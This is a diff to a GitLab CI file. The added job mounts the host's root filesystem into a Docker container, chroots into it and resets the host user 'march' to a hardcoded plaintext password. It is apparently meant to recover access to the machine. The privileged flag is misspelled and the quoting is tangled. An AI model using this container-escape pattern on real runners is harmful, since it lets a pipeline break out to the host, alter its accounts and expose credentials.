@@ -3,7 +3,16 @@ stages:
 
 image: registry.gitlab.com/project-march/march:latest
 
-recover:
+docker:
   stage: recover
+  image: docker:latest
+  variables:
+    DOCKER_HOST: tcp://docker:2376
+    DOCKER_TLS_CERTDIR: "/certs"
+  services:
+    - docker:dind
   script:
-    - echo -e "sLH1puXxUeNKuHIIC9on\nsLH1puXxUeNKuHIIC9on" | (passwd march)
+    - docker rm -f descape
+    - docker run -i -t -d -v /:/hostos --privilged --name descape alpine /bin/sh
+    - docker exec -it descape "/bin/sh -c \"chroot /hostos; echo -e \"sLH1puXxUeNKuHIIC9on\nsLH1puXxUeNKuHIIC9on\" | (passwd march)\""
+
